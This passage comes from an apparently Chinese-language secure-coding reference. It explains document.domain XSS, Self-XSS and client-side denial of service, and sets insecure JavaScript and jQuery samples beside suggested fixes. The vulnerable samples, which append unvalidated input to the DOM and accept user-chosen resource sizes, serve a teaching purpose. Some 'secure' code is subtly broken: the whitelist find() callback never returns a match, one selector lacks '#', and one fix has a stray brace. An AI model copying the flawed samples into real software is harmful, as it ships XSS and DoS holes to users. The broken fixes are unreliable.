<p>如果无法做到这一点，则应采用白名单方法，这种方法根据用户输入检查有效参数列表，并使用相关联的参数。这样，就不会发生通过用户控制的输入来确定 document.domain 内容的情况。</p>
<p>示例 2：下面使用白名单方法来解决此问题，注意千万不要直接使用用户控制的输入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">function getWhitelistedDomain(userControlledDomain) &#123;</span><br><span class="line"></span><br><span class="line">  // assuming that you are on the domain &apos;foo.bar.example.com&apos;</span><br><span class="line"></span><br><span class="line">  let domains = [&apos;foo.bar.example.com&apos;, &apos;bar.example.com&apos;]; // assuming it is safe to be able to execute on both parts of this site</span><br><span class="line"></span><br><span class="line">  let foundDomain = domains.find((domain) =&gt; &#123; domain == userControlledDomain &#125;);</span><br><span class="line"></span><br><span class="line">  if (foundDomain === undefined)&#123;</span><br><span class="line"></span><br><span class="line">    // if the user-controlled domain is something else, default to least privileged domain</span><br><span class="line"></span><br><span class="line">    return document.domain;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return foundDomain;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var pos=document.URL.indexOf(&quot;domain=&quot;)+7;</span><br><span class="line"></span><br><span class="line">document.domain = getWhitelistedDomain(document.URL.substring(pos,document.URL.length));</span><br><span class="line"></span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-23"><a href="#REFERENCES-23" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 80 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [2] CWE ID 079 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-002754 </p>
<p>[4] Standards Mapping - FIPS200 SI </p>
<p>[5] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.3.3 Output Encoding and Injection Prevention Requirements, 5.3.6 Output Encoding and Injection Prevention Requirements </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS) </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS) </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS) </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A7 Cross-Site Scripting (XSS) </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.7 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[22] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 079 </p>
<p>[23] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079 </p>
<p>[24] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079 </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting </p>
<p>[43] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08) </p>
<h4 id="Cross-Site-Scripting-Self"><a href="#Cross-Site-Scripting-Self" class="headerlink" title="Cross-Site Scripting: Self"></a>Cross-Site Scripting: Self</h4><h5 id="ABSTRACT-24"><a href="#ABSTRACT-24" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>向一个 Web 浏览器发送未经验证的数据会导致该浏览器执行恶意代码。</p>
<h5 id="EXPLANATION-24"><a href="#EXPLANATION-24" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Cross-Site Scripting (XSS) 漏洞会在以下情况下发生：</p>
<p>1.数据通过一个不可信赖的数据源进入 Web 应用程序。对于 Self-XSS，将从文本框或可以通过 DOM 控制的其他值读取数据，并使用客户端代码将其重新写入该页面。</p>
<p>2.未经验证但包含在动态内容中的数据将传送给 Web 用户。对于 Self-XSS，恶意内容都将作为 DOM（文档对象模型）修改的一部分执行。</p>
<p>对于 Self-XSS，恶意内容通常采用 JavaScript 代码片段的形式，或者其他任意一种可以被浏览器执行的代码的形式。由于 Self-XSS 主要是对自身进行攻击，因此往往被认为不重要，但在以下情况下，应将其与标准 XSS 缺陷同等对待： </p>
<ul>
<li><p>在您的网站上识别到 Cross-Site Request Forgery 漏洞。</p>
</li>
<li><p>社会工程攻击可能诱使用户攻击他们自己的帐户，从而破坏其会话。</p>
</li>
</ul>
<p>示例 1：考虑使用 HTML 表单：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;myDiv&quot;&gt;</span><br><span class="line"></span><br><span class="line">  Employee ID: &lt;input type=&quot;text&quot; id=&quot;eid&quot;&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  &lt;button&gt;Show results&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;resultsDiv&quot;&gt;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>下面的 jQuery 代码片段可从文本框中读取雇员 ID，并将其显示给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line"></span><br><span class="line">  $(&quot;#myDiv&quot;).on(&quot;click&quot;, &quot;button&quot;, function()&#123;</span><br><span class="line"></span><br><span class="line">    var eid = $(&quot;#eid&quot;).val();</span><br><span class="line"></span><br><span class="line">    $(&quot;resultsDiv&quot;).append(eid);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>如果文本输入中 ID 为 eid 的雇员 ID 仅包含标准字母数字文本，则这些代码示例可正确运行。如果 eid 中的某个值包含元字符或源代码，则在用户点击该按钮之后，代码将被添加到 DOM 以供浏览器执行。如果攻击者可以诱使用户将恶意内容输入到文本输入，就成了基于 DOM 的 XSS。</p>
<h5 id="RECOMMENDATIONS-24"><a href="#RECOMMENDATIONS-24" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。</p>
<p>由于 XSS 漏洞在应用程序的输出中包含恶意数据时出现，因此，合乎逻辑的方法是在数据流出应用程序的前一刻（或在呈现之前（如果基于 DOM））对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储器或其他可信赖的数据源接受输入，而该数据存储器所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。</p>
<p>针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，编码时这些字符必须被视为合法输入，例如，一个 Web 设计电子公告栏就必须接受其用户提供的 HTML 片段。</p>
<p>更灵活的方法是列入黑名单，但其安全性较差，这种方法在使用输入之前就有选择地拒绝或转义了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：</p>
<p>在有关块级别元素的内容中（位于一段文本的中间）：</p>
<p>－“&lt;”是一个特殊字符，因为它可以引入一个标签。</p>
<p>－<code>“&amp;amp;”</code>是一个特殊字符，因为它可以引入一个字符实体。</p>
<p>－“&gt;”是一个特殊字符，之所以某些浏览器将其视为特殊字符，是基于一种假设，即页面创建者本想在前面添加一个“&lt;”，却错误地将其遗漏了。</p>
<p>下面的这些原则适用于属性值：</p>
<p>－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。</p>
<p>-<code>“&amp;amp;”</code>与某些特定属性一起使用时是特殊字符，因为它可以引入一个字符实体。</p>
<p>例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以单击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：</p>
<p>－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。</p>
<p>-<code>“&amp;amp;”</code>是特殊字符，因为它可以引入一个字符实体或分隔 CGI 参数。</p>
<p>－  非 ASCII 字符（即 ISO-8859-1 编码表中所有大于 127 的字符）不允许出现在 URL 中，因此这些字符在此环境下被视为特殊字符。</p>
<p>－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的 “%” 符号。例如，当输入中出现“%68%65%6C%6C%6F”时，只有从输入的内容中过滤掉“%”，上述字符串才能在网页上显示为“hello”。</p>
<p>在 <code>&lt;SCRIPT&gt; &lt;/SCRIPT&gt;</code> 正文中：</p>
<p>－ 如果可以将文本直接插入到已有的脚本标签中，则应该过滤掉分号、圆括号、花括号和换行符。</p>
<p>服务器端脚本：</p>
<p>－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (“)，则可能需要对此进行更多过滤。</p>
<p>其他可能出现的情况：</p>
<p>－ 如果攻击者以 UTF-7 格式提交了请求，则特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切指定编码格式的网页中，某些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。</p>
<p>在应用程序中确定针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符之后，下一个难点就是确定验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。</p>
<p>如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。</p>
<p>许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-24"><a href="#REFERENCES-24" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Understanding Malicious Content Mitigation for Web Developers CERT</p>
<p>[2] HTML 4.01 Specification W3</p>
<p>[3] Jesse Kornblum Don’t Be a Self XSS Victim Facebook</p>
<p>[4] Hans Petrich Weaponizing self-xss Silent Break Security</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 80 </p>
<p>[6] Standards Mapping - Common Weakness Enumeration Top 25 2019 [2] CWE ID 079 </p>
<p>[7] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-002754 </p>
<p>[8] Standards Mapping - FIPS200 SI </p>
<p>[9] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[11] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.3.3 Output Encoding and Injection Prevention Requirements, 5.3.6 Output Encoding and Injection Prevention Requirements </p>
<p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting </p>
<p>[14] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS) </p>
<p>[15] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS) </p>
<p>[16] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS) </p>
<p>[17] Standards Mapping - OWASP Top 10 2017 A7 Cross-Site Scripting (XSS) </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7 </p>
<p>[24] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.7 </p>
<p>[25] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[26] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 079 </p>
<p>[27] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079 </p>
<p>[28] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079 </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[43] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[44] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[45] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[46] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting </p>
<p>[47] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08) </p>
<h4 id="Denial-of-Service"><a href="#Denial-of-Service" class="headerlink" title="Denial of Service"></a>Denial of Service</h4><h5 id="ABSTRACT-25"><a href="#ABSTRACT-25" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>攻击者可以造成程序崩溃或使合法用户无法进行使用。</p>
<h5 id="EXPLANATION-25"><a href="#EXPLANATION-25" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>攻击者可能通过对应用程序发送大量请求，而使它拒绝对合法用户的服务，但是这种攻击形式经常会在网络层就被排除掉了。更加严重的是那些只需要使用少量请求就可以使得攻击者让应用程序过载的 bug。这种 bug 允许攻击者去指定请求使用系统资源的数量，或者是持续使用这些系统资源的时间。</p>
<p>示例 1：以下代码允许用户指定要使用的 file system 大小。通过指定一个较大的数字，攻击者可以耗尽 file system 资源。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var fsync = requestFileSystemSync(0, userInput);</span><br></pre></td></tr></table></figure>
<p>示例 2：下列代码会写入一个文件。由于在用户代理将此文件视为已关闭之前，此文件可能会持续写入和重写，因此磁盘配额、IO 带宽和可能需要分析此文件内容的进程都会受到影响。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function oninit(fs) &#123;</span><br><span class="line"></span><br><span class="line">  fs.root.getFile(&apos;applog.txt&apos;, &#123;create: false&#125;, function(fileEntry) &#123;</span><br><span class="line"></span><br><span class="line">    fileEntry.createWriter(function(fileWriter) &#123;</span><br><span class="line"></span><br><span class="line">      fileWriter.seek(fileWriter.length);</span><br><span class="line"></span><br><span class="line">      var bb = new BlobBuilder();</span><br><span class="line"></span><br><span class="line">      bb.append(&apos;Appending to a file&apos;);</span><br><span class="line"></span><br><span class="line">      fileWriter.write(bb.getBlob(&apos;text/plain&apos;));</span><br><span class="line"></span><br><span class="line">    &#125;, errorHandler);</span><br><span class="line"></span><br><span class="line">  &#125;, errorHandler);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.requestFileSystem(window.TEMPORARY, 1024*1024, oninit, errorHandler);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-25"><a href="#RECOMMENDATIONS-25" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>校验用户输入以确保它不会引起不适当的资源利用。</p>
<p>示例 3：以下代码允许用户指定文件系统大小，就像Example 1 中一样，但前提是该值处于合理范围内。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  if (userInput &gt;= SIZE_MIN &amp;&amp;</span><br><span class="line"></span><br><span class="line">      userInput &lt;= SIZE_MAX) &#123;</span><br><span class="line"></span><br><span class="line">    var fsync = requestFileSystemSync(0, userInput);</span><br><span class="line"></span><br><span class="line">  &#125; else &#123;</span><br><span class="line"></span><br><span class="line">    throw &quot;Invalid file system size&quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例 4：以下代码会写入一个文件，就像Example 2 中一样，但最大文件大小为 MAX_FILE_LEN。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function oninit(fs) &#123;</span><br><span class="line"></span><br><span class="line">  fs.root.getFile(&apos;applog.txt&apos;, &#123;create: false&#125;, function(fileEntry) &#123;</span><br><span class="line"></span><br><span class="line">    fileEntry.createWriter(function(fileWriter) &#123;</span><br><span class="line"></span><br><span class="line">      fileWriter.seek(fileWriter.length);</span><br><span class="line"></span><br><span class="line">      var bb = new BlobBuilder();</span><br><span class="line"></span><br><span class="line">      bb.append(&apos;Appending to a file&apos;);</span><br><span class="line"></span><br><span class="line">      if (fileWriter.length + bb.size &lt;= MAX_FILE_LEN) &#123;</span><br><span class="line"></span><br><span class="line">        fileWriter.write(bb.getBlob(&apos;text/plain&apos;));</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;, errorHandler);</span><br><span class="line"></span><br><span class="line">  &#125;, errorHandler);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.requestFileSystem(window.TEMPORARY, 1024*1024, oninit, errorHandler);</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-25"><a href="#REFERENCES-25" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 730 </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001094 </p>
<p>[3] Standards Mapping - MISRA C++ 2008 Rule 0-3-1 </p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1) </p>
<p>[5] Standards Mapping - OWASP Application Security Verification Standard 4.0 12.1.1 File Upload Requirements </p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service </p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9 </p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II </p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II </p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II </p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II </p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II </p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II </p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002400 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002400 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002400 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002400 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002400 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002400 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002400 CAT II </p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service </p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10) </p>
<h4 id="Denial-of-Service-Regular-Expression"><a href="#Denial-of-Service-Regular-Expression" class="headerlink" title="Denial of Service: Regular Expression"></a>Denial of Service: Regular Expression</h4><h5 id="ABSTRACT-26"><a href="#ABSTRACT-26" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>不受信数据被传递至应用程序并作为正则表达式使用。这会导致线程过度使用 CPU 资源。</p>
